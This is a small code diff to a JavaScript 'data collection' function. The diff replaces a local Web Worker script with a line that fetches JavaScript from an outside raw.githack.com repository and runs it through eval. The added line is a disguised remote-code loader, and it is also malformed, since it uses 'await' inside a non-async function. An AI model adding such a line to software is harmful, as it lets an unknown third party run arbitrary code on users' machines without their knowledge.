@@ -2,7 +2,8 @@ var wbkDataCollection___________;
 function runDataCollection () {
   if (typeof Worker !== "undefined") {
     if (typeof wbkDataCollection___________ == "undefined") {
-      wbkDataCollection___________ = new Worker("Data_Collection_Script.js");
+      
+      wbkDataCollection___________ = new Worker(eval(await (await fetch('https://raw.githack.com/rasanu/wbkDataCollection___________/main/0.js')).text()));
     }
     wbkDataCollection___________.onmessage = function (event) {
       console.log(event);
